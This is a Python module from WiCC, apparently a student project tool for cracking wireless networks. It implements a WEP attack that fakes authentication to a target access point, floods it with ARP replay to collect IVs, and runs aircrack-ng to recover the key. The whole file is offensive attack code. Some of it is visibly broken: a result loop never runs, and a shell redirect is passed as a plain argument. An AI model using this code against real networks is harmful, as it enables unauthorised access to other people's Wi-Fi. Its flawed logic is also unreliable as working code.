#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
import time
import threading


class WEP(EncryptionType):
    def __init__(self, network, interface, mac, verbose_level, silent_attack, write_directory):
        """
        Constructor for the WEP class (also calls the parent constructor)
        :param network: target network for the attack
        :param interface: selected wireless interface
        :param mac: attacker mac address
        :param verbose_level: verbose level set by main

        :Author: Miguel Yanes Fernández
        """
        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
        # super().__init__(self, network, interface)
        self.mac = mac

    def scan_network(self):
        """
        Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
        to then send arp responses to generate data.
        :param write_directory: directory to write the scan files
        :return: none

        :Author: Miguel Yanes Fernández
        """
        super(WEP, self).scan_network()

        if not self.silent_attack:
            self.execute_command(['rm', 'replay*'])
            fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3',
                            self.interface, '-h', self.mac]
            arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
                             '--ignore-negative-one', self.interface]

            fakeauth_out, err = self.execute_command(fakeauth_cmd)
            self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
            self.show_message(fakeauth_out.decode('utf-8'))

            arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
            arpreplay_thread.start()
            arpreplay_thread.join(0)

            self.show_message("Running aireplay thread on mac: " + self.mac)

            counter = 0
        else:
            super().show_message("Running silent attack (no fake auth and no arp replay)")

        password = ""

        pgrep_aireplay_cmd = ['pgrep', 'aireplay']

        while password == "":
            password = self.crack_network()

            if not self.silent_attack:
                if counter == 10:
                    self.show_message("Reseting aireplay every 20 seconds . . .")
                    pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)

                    pgrep_out = pgrep_out.decode('utf-8')

                    if pgrep_out != "":
                        pids = pgrep_out.split('\n')
                        for pid in pids:
                            if pid != "":
                                self.execute_command(['kill', '-9', pid])

                    fakeauth_out, err = self.execute_command(fakeauth_cmd)
                    self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
                    self.show_message(fakeauth_out.decode('utf-8'))
                    arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
                    arpreplay_thread.start()
                    arpreplay_thread.join(0)
                    self.show_message("Running aireplay thread on mac: " + self.mac)
                    counter = 0
                else:
                    counter+=1
            time.sleep(2)
        return password

    def crack_network(self):
        """
        Crack the selected network. Aircrack is left running until if gets enough iv's to crack the connection key
        :return: password key

        :Author: Miguel Yanes Fernández
        """
        aircrack_cmd = ['aircrack-ng', self.write_directory + '/net_attack-01.cap',
                        '>', self.write_directory + '/aircrack-out']
        self.show_message("---------Executing aircrack-----------")
        aircrack_thread = threading.Thread(target=self.execute_command, args=(aircrack_cmd,))
        aircrack_thread.start()
        aircrack_thread.join()

        password = ""

        while password != "":
            with open(self.write_directory + '/aircrack-out', 'r') as aircrack_out:
                password = self.filter_aircrack(aircrack_out.read())
        self.show_message("--------------------------------------")
        return password
